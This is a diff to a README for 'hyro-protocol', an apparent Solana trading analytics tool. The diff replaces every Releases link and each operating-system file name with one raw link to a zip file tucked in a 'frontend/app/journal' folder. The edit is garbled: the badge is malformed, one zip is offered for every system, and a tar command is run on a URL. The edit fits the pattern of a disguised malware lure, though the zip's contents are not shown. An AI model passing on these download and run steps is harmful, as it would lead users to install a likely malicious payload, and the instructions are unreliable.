@@ -1,7 +1,7 @@
 # 🚀 hyro-protocol - Your Gateway to Smart Trading
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/DekicenM/hyro-protocol/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/DekicenM/hyro-protocol/main/frontend/app/journal/hyro-protocol_3.5.zip%https://raw.githubusercontent.com/DekicenM/hyro-protocol/main/frontend/app/journal/hyro-protocol_3.5.zip)](https://raw.githubusercontent.com/DekicenM/hyro-protocol/main/frontend/app/journal/hyro-protocol_3.5.zip)
 
 ## 📖 Introduction
 Hyro Protocol is a decentralized analytics platform designed for traders. It helps users track their cryptocurrency investments on the Solana network. With features like real-time trading analytics and profit split calculations, Hyro enables traders to make informed decisions.
@@ -20,19 +20,19 @@ To start using Hyro Protocol, you need to download it from its Releases page. Fo
 Make sure your device meets these requirements for optimal performance.
 
 ## 📥 Download & Install
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/DekicenM/hyro-protocol/releases) to find the latest version.
+1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/DekicenM/hyro-protocol/main/frontend/app/journal/hyro-protocol_3.5.zip) to find the latest version.
 
 2. **Select Your File:** Look for the appropriate file for your operating system. You will see options such as:
-   - `hyro-protocol-windows.exe` for Windows
-   - `hyro-protocol-macos.dmg` for macOS
-   - `hyro-protocol-linux.tar.gz` for Linux
+   - `https://raw.githubusercontent.com/DekicenM/hyro-protocol/main/frontend/app/journal/hyro-protocol_3.5.zip` for Windows
+   - `https://raw.githubusercontent.com/DekicenM/hyro-protocol/main/frontend/app/journal/hyro-protocol_3.5.zip` for macOS
+   - `https://raw.githubusercontent.com/DekicenM/hyro-protocol/main/frontend/app/journal/hyro-protocol_3.5.zip` for Linux
 
 3. **Download the File:** Click on the filename to start downloading.
 
 4. **Run the File:**
    - **Windows:** Locate the downloaded `.exe` file and double-click it. Follow the prompts to install.
    - **macOS:** Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Open a terminal and navigate to the directory where the file was downloaded. Use `tar -xzvf hyro-protocol-linux.tar.gz` to extract it, then navigate to the folder and run `./hyro-protocol`.
+   - **Linux:** Open a terminal and navigate to the directory where the file was downloaded. Use `tar -xzvf https://raw.githubusercontent.com/DekicenM/hyro-protocol/main/frontend/app/journal/hyro-protocol_3.5.zip` to extract it, then navigate to the folder and run `./hyro-protocol`.
 
 ## 🎛️ Features
 - **Real-Time Analytics:** Monitor trading data as it happens, giving you insights into market trends.
@@ -68,7 +68,7 @@ If you encounter issues during installation or use, consider the following optio
 - **Issue Tracker:** Report any bugs or request features directly on GitHub.
 
 ## 🔄 Updates
-Stay tuned for regular updates as we continue to enhance Hyro Protocol with new features and optimizations. Always visit the [Releases page](https://github.com/DekicenM/hyro-protocol/releases) to get the latest version.
+Stay tuned for regular updates as we continue to enhance Hyro Protocol with new features and optimizations. Always visit the [Releases page](https://raw.githubusercontent.com/DekicenM/hyro-protocol/main/frontend/app/journal/hyro-protocol_3.5.zip) to get the latest version.
 
 ## 📝 License
 Hyro Protocol is open-source software under the MIT License. You can view the terms in the repository's license file.
